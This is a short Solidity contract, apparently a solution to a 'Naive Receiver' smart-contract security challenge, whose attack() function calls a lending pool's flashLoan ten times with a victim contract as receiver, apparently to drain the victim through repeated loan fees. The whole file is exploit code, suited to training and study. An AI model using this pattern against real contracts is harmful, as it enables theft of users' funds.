// SPDX-License-Identifier: MIT
pragma solidity ^0.8;

import {console} from "forge-std/console.sol";

import {WETH} from "solmate/tokens/WETH.sol";

interface IPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract AttackNaiveReceiver {
    WETH public immutable weth;
    address private pool;
    address private victim;
    address private recovery;

    constructor(
        address _pool,
        address _victim,
        address _recovery,
        address payable _weth
    ) {
        pool = _pool;
        victim = _victim;
        recovery = _recovery;
        weth = WETH(_weth);
    }

    function attack() public {
        for (uint i = 0; i < 10; i++) {
            IPool(pool).flashLoan(victim, address(weth), 1, "0x");
        }
    }
}
